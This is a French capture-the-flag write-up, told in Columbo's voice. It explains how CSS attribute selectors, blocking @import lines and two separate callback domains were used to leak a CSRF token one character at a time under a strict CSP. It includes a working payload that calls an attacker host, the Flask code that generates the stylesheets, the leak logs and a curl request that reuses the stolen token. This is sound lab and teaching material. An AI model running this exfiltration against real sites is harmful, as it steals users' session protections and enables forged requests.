---
layout: default
---

# Juste une dernière `@import` : comment j'ai volé un token CSRF avec du CSS

Ah, excusez-moi, je me présente -- lieutenant Columbo, division cybercriminalité. On m'a refilé un dossier bizarre. Un formulaire web avec un token CSRF planqué dans un `<input>`, une CSP béton qui bloque tout JavaScript, et un admin bot qui visite les liens qu'on lui soumet. Le genre de truc où mes collègues disent "pas de JS, pas d'exfil". Moi je dis : on va voir.

## Le terrain

La page cible embarque un champ caché :

```html
<input type="text" name="csrf" value="ruW...32chars..." class="csrf" />
```

Un formulaire de signalement permet de soumettre une URL à un admin bot. La CSP est claire :

```
default-src 'none'; style-src 'unsafe-inline' *; img-src *; require-trusted-types-for 'script'
```

`style-src *` -- n'importe quelle feuille de style externe est autorisée. Et `img-src *` laisse passer les requêtes d'images vers n'importe quel domaine. `default-src 'none'` verrouille tout le reste. Pas de `script-src`, pas de `connect-src`. Le paramètre `?style=` de la page injecte un `@import url("X.css")` dans le DOM.

C'est fou c'qu'un détail peut avoir son importance quand on s'y attache. Ce `style-src *` là, c'est la porte dérobée.

## Le principe : exfiltration séquentielle par CSS

L'idée repose sur les sélecteurs d'attribut CSS. Si le token commence par `r`, alors :

```css
input[value^="r"] { background-image: url("https://leak.lab/leak?p=r"); }
```

...déclenche une requête HTTP vers mon serveur. Je connais le premier caractère. Je recommence avec `ru`, `rr`, `ra`... jusqu'à trouver le deuxième. Et ainsi de suite, 34 fois.

Le problème : il faut que tout se passe en **une seule visite** de l'admin bot. Pas question de faire 34 allers-retours.

## L'architecture : 40 `@import` parallèles qui bloquent

Mon serveur Flask sert un fichier `evil.css` contenant 40 directives `@import` simultanées :

```css
@import url("https://css-server.lab/round/0");
@import url("https://css-server.lab/round/1");
@import url("https://css-server.lab/round/2");
/* ... jusqu'à round/39 */
```

Chaque endpoint `/round/N` **bloque** tant que N caractères n'ont pas été exfiltrés. Quand c'est le cas, il renvoie une feuille CSS avec les sélecteurs pour deviner le caractère N+1 :

```python
@app.route('/round/<int:n>')
def round_css(n):
    while len(leaked_token) < n:
        time.sleep(0.1)
    prefix = leaked_token[:n]
    rules = []
    for c in CHARSET:
        escaped = css_escape(c)
        encoded = url_encode(prefix + c)
        rules.append(
            f'input[value^="{prefix}{escaped}"] '
            f'{{ background-image: url("https://leak-server.lab/leak?p={encoded}"); }}'
        )
    return '\n'.join(rules), 200, {'Content-Type': 'text/css'}
```

L'endpoint `/leak` reçoit les callbacks, extrait le caractère supplémentaire, et débloque le round suivant.

## Première tentative : tout sur le même domaine

Je lance un tunnel cloudflared, un seul domaine pour tout. Je soumets l'URL à l'admin bot.

Résultat : **3 caractères**. `ruW`. Puis plus rien.

Je me gratte la tête, je fouille mes logs, je relis mon code trois fois. Tout a l'air correct. Qu'est-ce qui cloche ?

Le problème est vicieux : le navigateur maintient un **pool de connexions limité par domaine** (6 connexions en HTTP/1.1). Mes 40 `@import` saturent le pool. Quand le navigateur veut envoyer le callback `background-image` vers `/leak`, il est sur le **même domaine** -- la requête est mise en file d'attente derrière les imports qui, eux, attendent le leak. **Deadlock.**

Les 3 premiers caractères passent uniquement parce que quelques connexions se libèrent juste assez vite au démarrage.

## Deuxième tentative : `@import` chaîné récursif

Je me dis : si le parallélisme pose problème, je vais chaîner. Chaque round renvoie son CSS + un `@import` vers le round suivant. Séquentiel, propre.

```css
/* round/0 retourne : */
input[value^="a"] { background-image: url("..."); }
/* ... */
@import url("https://css-server.lab/round/1");
```

Résultat : **1 caractère**. Pire qu'avant.

Le navigateur attend que l'`@import` imbriqué soit résolu **avant** d'appliquer les règles du bloc parent. Le round/1 bloque en attendant le leak du round/0, qui ne se déclenche jamais parce que les règles du round/0 ne sont pas encore appliquées. Re-deadlock, mais en pire.

Retour au parallèle.

## Le fix : deux domaines, deux pools

La solution tient en une ligne de raisonnement : si le bottleneck c'est le pool de connexions par domaine, il faut **séparer les domaines**. Un pour les CSS (`css-imports.lab`), un pour les callbacks de leak (`leak-callbacks.lab`).

Deux tunnels cloudflared vers le même serveur Flask local, deux sous-domaines distincts. Les `@import` pointent vers le premier, les `background-image` vers le second. Le navigateur utilise deux pools séparés -- les callbacks ne sont plus bloqués par les imports.

## Le charset qui manque

Je relance. Ca monte : `r`, `u`, `W`... et ça bloque à 3 caractères. Encore.

Ah, j'oubliais... le token n'est pas alphanumérique pur. Il contient des `-`, des `=`, des `@`. Mon charset initial `[a-zA-Z0-9]` ne couvre pas tout. Le quatrième caractère est un tiret, aucun sélecteur ne matche, le round/3 attend indéfiniment.

J'étends le charset avec les caractères spéciaux, en prenant soin de les **escape correctement** côté CSS (`\-` dans les sélecteurs) et de les **URL-encoder** côté callback (`%2D` pour `-`, `%3D` pour `=`, `%40` pour `@`).

## 34 caractères, une visite

Je relance le tout. Cette fois les logs défilent :

```
[+] Leaked: r
[+] Leaked: ru
[+] Leaked: ruW
[+] Leaked: ruW-
[+] Leaked: ruW-x
...
[+] Leaked: ruW-xK9@mP2dLqR5nHs7vB3fYw=jT8cAe6Zi
[+] COMPLETE: 34 chars
```

Quand je vais dire ça à ma femme, elle ne va pas me croire. 34 caractères exfiltrés en une seule visite de l'admin, sans une ligne de JavaScript, rien que du CSS.

## Soumission du formulaire

Avec le token en poche, un simple `curl` :

```bash
curl -X POST https://vulnerable-forum.lab/submit \
  -d "csrf=ruW-xK9@mP2dLqR5nHs7vB3fYw%3DjT8cAe6Zi" \
  -d "action=validate" \
  -b "session=REDACTED"
```

Flag validé.

## Ce qu'on retient

| Concept | Detail |
|---|---|
| **CSS attribute selectors** | `input[value^="prefix"]` permet de tester le début d'une valeur sans JS |
| **`@import` bloquant** | Le navigateur attend la réponse avant de passer à la suite -- exploitable comme primitive de synchronisation |
| **Pool de connexions par domaine** | 6 connexions max en HTTP/1.1 par origine ; mixer imports et callbacks sur le même domaine = deadlock |
| **Séparation des domaines** | Deux origines distinctes = deux pools indépendants, le leak flow ne bloque plus |
| **`@import` chaîné** | Le navigateur attend la résolution complète de l'arbre d'imports avant d'appliquer les règles -- inutilisable pour du séquentiel |
| **Charset complet** | Toujours inclure les caractères spéciaux (`-`, `=`, `@`, `_`, `+`) dans les candidats, avec l'escaping CSS et l'URL-encoding qui vont avec |

## Outils utilisés

- **Flask** (Python) -- serveur CSS dynamique et collecteur de leaks
- **cloudflared** -- deux tunnels pour exposer le serveur local sur deux domaines distincts
- **curl** -- soumission du bug report et du formulaire final
- **Navigateur headless** (côté admin bot) -- le vecteur d'exécution involontaire

---

*Juste une dernière chose : la prochaine fois que quelqu'un vous dit que CSS c'est pas un vecteur d'attaque, montrez-lui la CSP.*
